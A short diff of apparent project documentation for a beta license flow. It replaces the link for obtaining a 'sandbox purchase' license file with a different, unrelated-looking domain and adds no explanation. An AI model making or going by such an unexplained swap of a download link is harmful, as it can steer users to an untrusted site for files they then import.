@@ -74,7 +74,7 @@ what to do if an update fails.
 ## Get and import the beta license
 
 The beta uses the actual license import and validation flow. To get a test
-license, visit [echteralsfake.me](https://echteralsfake.me/) and press the
+license, visit [pornfetch.to](https://pornfetch.to/) and press the
 **sandbox purchase** button. Follow the site's instructions to obtain the
 license file. **This is not a real transaction. No money is processed. You do
 not need to send cryptocurrency or pay a fee; pressing the button is the test.**
